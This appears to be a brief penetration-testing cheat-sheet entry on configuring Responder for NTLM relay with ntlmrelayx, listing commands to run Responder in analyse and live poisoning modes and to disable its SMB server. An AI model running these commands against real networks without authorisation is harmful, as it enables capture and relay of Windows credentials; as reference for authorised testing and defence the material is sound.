# 12.11 Responder Relay Setup

> Disable Responder's SMB/HTTP servers in `Responder.conf` before launching `ntlmrelayx` — run analyse mode first to map auth flows.

## Overview

Disable SMB (and optionally HTTP) in Responder.conf before running ntlmrelayx. Run Responder in analyse mode first to map who authenticates where.

## Steps

- **-A analyse mode** — observe without responding.
- **sed SMB = Off** — disable Responder's SMB server so ntlmrelayx handles it.

## Commands

### Responder setup for relay

```bash
sudo python3 Responder.py -I ens192 -A
sudo python3 Responder.py -I ens192
sed -i "s/SMB = On/SMB = Off/" Responder.conf
```
